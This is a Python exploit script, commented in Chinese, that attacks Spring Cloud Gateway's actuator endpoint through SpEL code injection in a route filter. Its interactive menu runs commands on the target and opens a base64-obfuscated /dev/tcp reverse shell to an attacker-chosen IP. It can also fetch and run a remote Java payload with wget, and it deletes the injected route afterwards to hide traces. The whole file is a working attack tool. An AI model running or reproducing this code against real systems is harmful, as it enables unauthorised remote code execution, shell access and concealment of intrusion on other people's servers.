import base64
import time
import requests
import json
import re
import eventlet

def exec(url, pld, id):
    headers1 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/json'
    }

    headers2 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    ## 替换payload中的id可任意执行命令
    payload = '''{\r
      "id": "hacktest",\r
      "filters": [{\r
        "name": "AddResponseHeader",\r
        "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\'''' + pld + '''\').getInputStream()))}"}\r
        }],\r
      "uri": "http://121.40.186.15:9000",\r
      "order": 0\r
    }'''
    # 添加恶意路由
    re1 = requests.post(url=url + "/actuator/gateway/routes/hacktest", data=payload, headers=headers1, json=json)
    # 刷新配置
    start = time.time()
    eventlet.monkey_patch()  # 必须加这条代码
    re3 = ""
    try:
        # Dontla 20200421 超时将抛出异常
        with eventlet.Timeout(5, True):  # 设置超时时间为5秒
            re2 = requests.post(url=url + "/actuator/gateway/refresh", headers=headers2)
    # 访问恶意路由
        re3 = requests.get(url=url + "/actuator/gateway/routes/hacktest", headers=headers2)
    # 清理痕迹
        re4 = requests.delete(url=url + "/actuator/gateway/routes/hacktest", headers=headers2)
        re5 = requests.post(url=url + "/actuator/gateway/refresh", headers=headers2)
    except eventlet.timeout.Timeout:
    # except:   # （或，两种都行，注意不能用except Exception，因为Exception是异常基类，我们这个超时异常未包含在它里面）
    # 清理痕迹
        re4 = requests.delete(url=url + "/actuator/gateway/routes/hacktest", headers=headers2)
        re5 = requests.post(url=url + "/actuator/gateway/refresh", headers=headers2)
    if id == 1:
        print(re3.text)
        sm = re.findall("AddResponseHeader Result", re3.text)
        if re3.status_code == 200 and str(sm[0]) == "AddResponseHeader Result":

            print("存在漏洞，可以进尝试反弹shell!!")
        else:
            print("状态码：" + str(re3.status_code))
            print("路由创建失败，可能不存在漏洞，请手动检测")
    elif id == 2:
        end = time.time()
        if int(end - start) <= 4:
            print("反弹shell失败")
    elif id == 3: # 判断是否出网，默认访问百度
        if re3.status_code == 200:
            print("目标出网！！可以尝试第四个功能")


def base64_Encode(pld):  # base64编码
    bytes_url = pld.encode("utf-8")
    str_url = base64.b64encode(bytes_url)  # 被编码的参数必须是二进制数据
    str_url = str(str_url)
    a = r"b\'(.+?)\'"
    sm = re.findall(a, str_url)
    return sm[0]


def payload(id):
    if id == 1:  # 编译反弹shell命令
        IP = input("请输入接受反弹shell的IP：")
        port = input("请输入接受反弹shell的端口：")
        pld = base64_Encode(f"bash -i >& /dev/tcp/{IP}/{port} 0>&1")
        return "bash -c {echo," + pld + "}|{base64,-d}|{bash,-i}"
    elif id == 2:  # 使用java代码反弹shell
        url = input("请输入托管文件的地址：")
        pld = base64_Encode(f"wget {url} && java shell && rm -f shell.class")
        return "bash -c {echo," + pld + "}|{base64,-d}|{bash,-i}"


if __name__ == "__main__":

    print("注意url最后不要带有'/'，以端口结尾!!")
    url = input("检测目标：")
    while True:
        print('''
            "1.检测目标是否存在漏洞(payload:whoami)"\r
            "2.使用/dev/tcp反弹shell"\r
            "3.检测目标是否出网"\r
            "4.使用java代码反弹shell"\r
            "0.退出"\r
            ''')
        num = int(input("选择功能："))
        pld = ""
        if num == 0:
            break
        if num == 1:
            pld = "whoami"
        elif num == 2:
            pld = payload(1)
        elif num == 3:
            pld = "curl www.baidu.com"
        elif num == 4:
            pld = payload(2)
        exec(url, pld, num)
